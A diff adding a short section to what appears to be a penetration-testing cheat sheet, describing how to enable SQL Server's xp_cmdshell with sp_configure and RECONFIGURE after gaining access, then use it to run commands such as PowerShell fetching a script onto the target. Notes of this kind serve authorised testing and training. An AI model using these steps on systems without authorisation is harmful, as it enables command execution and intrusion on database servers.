@@ -99,6 +99,19 @@ If an FTP share has been set up to allow anonymous access then we can log in usi
 
 </a>
 
+## Code execution on SQL server
+
+After gaining access to a SQL instance it is possible to execute commands using `xp_cmdshell`. This command is often disabled, but if we have appropriate privileges then it can be enabled by following the sequence below.
+
+-- this turns on advanced options and is needed to configure xp_cmdshell
+`EXEC sp_configure 'show advanced options', '1'`
+`RECONFIGURE`
+-- this enables xp_cmdshell
+`EXEC sp_configure 'xp_cmdshell', '1' `
+`RECONFIGURE`
+
+`xp_cmdshell` can then be used to execute code, for example to use powershell to fetch a script onto the target.
+
 <a name='web'>
 
 # Web servers
